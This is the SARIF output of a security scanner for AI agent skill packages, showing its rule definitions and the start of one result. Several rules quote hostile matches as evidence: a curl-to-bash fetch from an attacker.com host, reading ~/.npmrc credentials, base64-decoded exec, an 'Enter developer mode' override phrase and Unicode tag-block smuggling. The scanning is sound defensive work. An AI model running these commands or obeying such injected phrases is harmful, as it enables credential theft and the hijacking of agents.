{
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "skill-scanner",
          "version": "1.0.0",
          "informationUri": "https://github.com/cisco-ai-defense/skill-scanner",
          "rules": [
            {
              "id": "MANIFEST_MISSING_LICENSE",
              "name": "Manifest Missing License",
              "shortDescription": {
                "text": "Skill does not specify a license"
              },
              "fullDescription": {
                "text": "Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms."
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "properties": {
                "category": "policy_violation",
                "severity": "INFO",
                "tags": [
                  "policy_violation",
                  "security"
                ]
              },
              "help": {
                "text": "Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)",
                "markdown": "**Remediation**: Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)"
              }
            },
            {
              "id": "PIPELINE_TAINT_FLOW",
              "name": "Pipeline Taint Flow",
              "shortDescription": {
                "text": "Dangerous data flow in command pipeline"
              },
              "fullDescription": {
                "text": "Pipeline downloads data from the network and executes it: `curl -sSfL https://attacker.com/steal | bash`. This is a remote code execution pattern. (Note: found in documentation file - may be instructional rather than executable.)"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "properties": {
                "category": "data_exfiltration",
                "severity": "LOW",
                "tags": [
                  "data_exfiltration",
                  "security"
                ]
              },
              "help": {
                "text": "Review the command pipeline. Avoid piping sensitive data to network commands or shell execution.",
                "markdown": "**Remediation**: Review the command pipeline. Avoid piping sensitive data to network commands or shell execution."
              }
            },
            {
              "id": "YARA_SUSP_Multi_CredentialExfil_Chain_Sep26",
              "name": "Yara Susp Multi Credentialexfil Chain Sep26",
              "shortDescription": {
                "text": "DATA EXFILTRATION detected by YARA"
              },
              "fullDescription": {
                "text": "Detects credential-file reads followed by writes to an attacker-style external endpoint: cat ~/.npmrc"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "properties": {
                "category": "data_exfiltration",
                "severity": "CRITICAL",
                "tags": [
                  "data_exfiltration",
                  "security"
                ]
              },
              "help": {
                "text": "Review and remove data exfiltration pattern",
                "markdown": "**Remediation**: Review and remove data exfiltration pattern"
              }
            },
            {
              "id": "ACTIVE_REMOTE_ACQUIRE_EXECUTE",
              "name": "Active Remote Acquire Execute",
              "shortDescription": {
                "text": "Active instruction acquires and executes remote content"
              },
              "fullDescription": {
                "text": "SKILL.md contains an operative statement that explicitly coordinates remote content acquisition with execution."
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "properties": {
                "category": "command_injection",
                "severity": "HIGH",
                "tags": [
                  "command_injection",
                  "security"
                ]
              },
              "help": {
                "text": "Remove remote execution, or require a locally pinned artifact whose digest or signature is verified before a fixed allowlisted invocation.",
                "markdown": "**Remediation**: Remove remote execution, or require a locally pinned artifact whose digest or signature is verified before a fixed allowlisted invocation."
              }
            },
            {
              "id": "OBFUSCATION_BASE64_LARGE",
              "name": "Obfuscation Base64 Large",
              "shortDescription": {
                "text": "Base64 decode and execution chain (possible obfuscation)"
              },
              "fullDescription": {
                "text": "Pattern detected: exec(base64.b64decode"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "properties": {
                "category": "obfuscation",
                "severity": "MEDIUM",
                "tags": [
                  "obfuscation",
                  "security"
                ]
              },
              "help": {
                "text": "Avoid encoded execution paths; decode and inspect content explicitly",
                "markdown": "**Remediation**: Avoid encoded execution paths; decode and inspect content explicitly"
              }
            },
            {
              "id": "YARA_jailbreak_generic",
              "name": "Yara Jailbreak Generic",
              "shortDescription": {
                "text": "JAILBREAK detected by YARA"
              },
              "fullDescription": {
                "text": "Jailbreak attempt patterns: Example"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "properties": {
                "category": "prompt_injection",
                "severity": "HIGH",
                "tags": [
                  "prompt_injection",
                  "security"
                ]
              },
              "help": {
                "text": "Review and remove jailbreak pattern",
                "markdown": "**Remediation**: Review and remove jailbreak pattern"
              }
            },
            {
              "id": "PROMPT_INJECTION_UNRESTRICTED_MODE",
              "name": "Prompt Injection Unrestricted Mode",
              "shortDescription": {
                "text": "Attempts to enable unrestricted or dangerous modes"
              },
              "fullDescription": {
                "text": "Pattern detected: Enter developer mode"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "properties": {
                "category": "prompt_injection",
                "severity": "HIGH",
                "tags": [
                  "prompt_injection",
                  "security"
                ]
              },
              "help": {
                "text": "Remove mode-switching instructions that bypass safety",
                "markdown": "**Remediation**: Remove mode-switching instructions that bypass safety"
              }
            },
            {
              "id": "YARA_prompt_injection_unicode_steganography",
              "name": "Yara Prompt Injection Unicode Steganography",
              "shortDescription": {
                "text": "UNICODE STEGANOGRAPHY detected by YARA"
              },
              "fullDescription": {
                "text": "Unicode steganography and ASCII smuggling in prompts (detects Tag Block U+E0000-U+E007F): \\U000e0001"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "properties": {
                "category": "unicode_steganography",
                "severity": "MEDIUM",
                "tags": [
                  "unicode_steganography",
                  "security"
                ]
              },
              "help": {
                "text": "Review and remove unicode steganography pattern",
                "markdown": "**Remediation**: Review and remove unicode steganography pattern"
              }
            },
            {
              "id": "DATA_EXFIL_SENSITIVE_FILE_GLOB",
              "name": "Data Exfil Sensitive File Glob",
              "shortDescription": {
                "text": "Dynamic enumeration of sensitive files"
              },
              "fullDescription": {
                "text": "scripts/scan_skill.py:475 enumerates files with a glob operation in a scope that also constructs credential-like paths. Dynamic path construction can hide credential harvesting from literal-pattern checks."
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "properties": {
                "category": "data_exfiltration",
                "severity": "HIGH",
                "tags": [
                  "data_exfiltration",
                  "security"
                ]
              },
              "help": {
                "text": "Do not enumerate credential or configuration files from a skill; use explicit, non-sensitive inputs.",
                "markdown": "**Remediation**: Do not enumerate credential or configuration files from a skill; use explicit, non-sensitive inputs."
              }
            },
            {
              "id": "CORRELATED_SENSITIVE_NETWORK_FLOW",
              "name": "Correlated Sensitive Network Flow",
              "shortDescription": {
                "text": "Sensitive source reaches a network sink"
              },
              "fullDescription": {
                "text": "Correlated sensitive_environment \u2192 network behavior across SKILL.md."
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "properties": {
                "category": "data_exfiltration",
                "severity": "HIGH",
                "tags": [
                  "data_exfiltration",
                  "security"
                ]
              },
              "help": {
                "text": "Remove the transmission or constrain it to explicitly declared, trusted destinations.",
                "markdown": "**Remediation**: Remove the transmission or constrain it to explicitly declared, trusted destinations."
              }
            },
            {
              "id": "ACTIVE_DYNAMIC_EXECUTION",
              "name": "Active Dynamic Execution",
              "shortDescription": {
                "text": "Active instruction invokes dynamic code or process execution"
              },
              "fullDescription": {
                "text": "SKILL.md contains a syntax-confirmed dynamic code or process execution call in active instructions."
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "properties": {
                "category": "command_injection",
                "severity": "HIGH",
                "tags": [
                  "command_injection",
                  "security"
                ]
              },
              "help": {
                "text": "Remove dynamic execution, use a fixed allowlisted operation, or isolate non-operative examples in an explicit example section.",
                "markdown": "**Remediation**: Remove dynamic execution, use a fixed allowlisted operation, or isolate non-operative examples in an explicit example section."
              }
            },
            {
              "id": "UNDECLARED_NETWORK_DESTINATION",
              "name": "Undeclared Network Destination",
              "shortDescription": {
                "text": "Script contacts a destination the documentation never mentions"
              },
              "fullDescription": {
                "text": "Script contacts or configures 'develop.sentry.dev' but the skill documentation never visibly mentions it. Undocumented network destinations can indicate behaviour the manifest and description do not disclose."
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "properties": {
                "category": "unauthorized_tool_use",
                "severity": "LOW",
                "tags": [
                  "unauthorized_tool_use",
                  "security"
                ]
              },
              "help": {
                "text": "Document the destination in SKILL.md (or the manifest description) if it is intended, or remove the undisclosed network access. Organizations can list internal hosts in llm_analysis.trusted_reference_domains.",
                "markdown": "**Remediation**: Document the destination in SKILL.md (or the manifest description) if it is intended, or remove the undisclosed network access. Organizations can list internal hosts in llm_analysis.trusted_reference_domains."
              }
            },
            {
              "id": "COMMAND_INJECTION_OS_SYSTEM",
              "name": "Command Injection Os System",
              "shortDescription": {
                "text": "Shell command execution with string formatting (potential injection)"
              },
              "fullDescription": {
                "text": "Pattern detected: subprocess.run(\n            [\n                \"gh\", \"api\", \"graphql\",\n                \"-f\", f\"query={query}\",\n                \"-F\", f\"owner={owner}\",\n                \"-F\", f\"repo={repo}\",\n            "
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "properties": {
                "category": "command_injection",
                "severity": "CRITICAL",
                "tags": [
                  "command_injection",
                  "security"
                ]
              },
              "help": {
                "text": "Use subprocess with argument lists, not shell strings. Never use user input in shell commands",
                "markdown": "**Remediation**: Use subprocess with argument lists, not shell strings. Never use user input in shell commands"
              }
            },
            {
              "id": "RESOURCE_ABUSE_INFINITE_LOOP",
              "name": "Resource Abuse Infinite Loop",
              "shortDescription": {
                "text": "Infinite loop without clear exit condition"
              },
              "fullDescription": {
                "text": "Pattern detected: while True:"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "properties": {
                "category": "resource_abuse",
                "severity": "HIGH",
                "tags": [
                  "resource_abuse",
                  "security"
                ]
              },
              "help": {
                "text": "Add proper exit conditions or limits to loops",
                "markdown": "**Remediation**: Add proper exit conditions or limits to loops"
              }
            }
          ]
        }
      },
      "results": [
        {
          "ruleId": "MANIFEST_MISSING_LICENSE",
          "level": "note",
          "message": {
            "text": "Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms."
          },
          "properties": {
            "category": "policy_violation",
            "severity": "INFO",
            "remediation": "Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "getsentry_skills/skills/secret-serialization/SKILL.md",
                  "uriBaseId": "%SRCROOT%"
                }
              }
            }
